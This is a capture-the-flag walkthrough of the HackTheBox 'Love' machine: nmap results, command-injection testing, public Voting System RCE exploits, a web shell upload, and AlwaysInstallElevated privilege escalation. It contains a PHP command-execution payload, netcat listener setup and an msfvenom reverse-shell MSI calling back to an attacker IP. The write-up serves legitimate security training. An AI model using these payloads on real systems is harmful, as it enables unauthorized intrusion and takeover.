---
title: "Love"
date: 2023-11-07
categories: HTB
tags: ["love", "htb walkthrough", "ctf", "cybersecurity", "hackthebox", "htb writeup", "penetration testing", "writeup", "htb"]
---

## Enumeration
# Nmap

```sh
PORT      STATE SERVICE      REASON  VERSION
80/tcp    open  http         syn-ack Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Voting System using PHP
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     syn-ack Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in/organizationalUnitName=love.htb/localityName=norway/emailAddress=roy@love.htb
| Issuer: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in/organizationalUnitName=love.htb/localityName=norway/emailAddress=roy@love.htb
|_http-title: 403 Forbidden
445/tcp   open  microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql?       syn-ack
| mysql-info: 
|_  MySQL Error: Host '10.10.14.42' is not allowed to connect to this MariaDB server
| fingerprint-strings: 
|   Arucer, Hello, NULL, SSLSessionReq, ZendJavaBridge, afp, dominoconsole, epmd, gkrellm, ibm-mqseries, mongodb, redis-server, riak-pbc, tarantool, vp3: 
|_    Host '10.10.14.42' is not allowed to connect to this MariaDB server
5000/tcp  open  http         syn-ack Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
5040/tcp  open  unknown      syn-ack
5985/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http     syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2024-07-21T08:04:42+00:00; +21m34s from scanner time.
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Issuer: commonName=LOVE
7680/tcp  open  pando-pub?   syn-ack
47001/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        syn-ack Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack Microsoft Windows RPC
49668/tcp open  msrpc        syn-ack Microsoft Windows RPC
49669/tcp open  msrpc        syn-ack Microsoft Windows RPC
49670/tcp open  msrpc        syn-ack Microsoft Windows RPC
```
## HTTP
### Gobuster

![gobuster](/assets/images/love11.png)

### Screenshots

![screenshot](/assets/images/love1.png)

http://staging.love.htb/

![screenshot](/assets/images/love2.png)

http://staging.love.htb/beta.php

![/assets/images/love3.png]

### Test for command injection

![/assets/images/love7.png]

![/assets/images/love6.png]

### Test for reverse shell

```sh
# kali
python3 -m http.server 80
# kali
nc -lvnp 9001
# form
http://10.10.14.42/$(<?=`$_GET[0]`?>)
```

![/assets/images/love8.png]

### `/admin`

http://10.10.10.239/Admin/

![/assets/images/love9.png]

### `/plugins`

http://10.10.10.239/plugins/

![/assets/images/love10.png]

# Foothold
- Searching for `voting system` gives public exploit
- Using a [public exploit](https://www.exploit-db.com/exploits/49843) gives initial shell as phoebe.

The public exploit
![/assets/images/love12.png]

http://10.10.10.239/admin

![/assets/images/love13.png]

http://10.10.10.239/

![/assets/images/love14.png]

-> did not work on this URL

![/assets/images/love15.png]

Trying a different exploit [Voting Ssytem 1.0-Remote Code Execution (Unauthenticated)](https://www.exploit-db.com/exploits/49846). 

![/assets/images/love16.png]

upload a shell

![/assets/images/love17.png]

rev.ps1

![/assets/images/love18.png]

![/assets/images/love19.png]

PHP Ivan web shell

![/assets/images/love20.png]

# Privilege Escalation

![/assets/images/love21.png]

![/assets/images/love22.png]

![/assets/images/love23.png]

![/assets/images/love24.png]

[HackTricks on AlwaysInstallElevated](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)

![/assets/images/love25.png]

```sh
msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.42 LPORT=443 -f msi -o rev.msi
```

![/assets/images/love26.png]
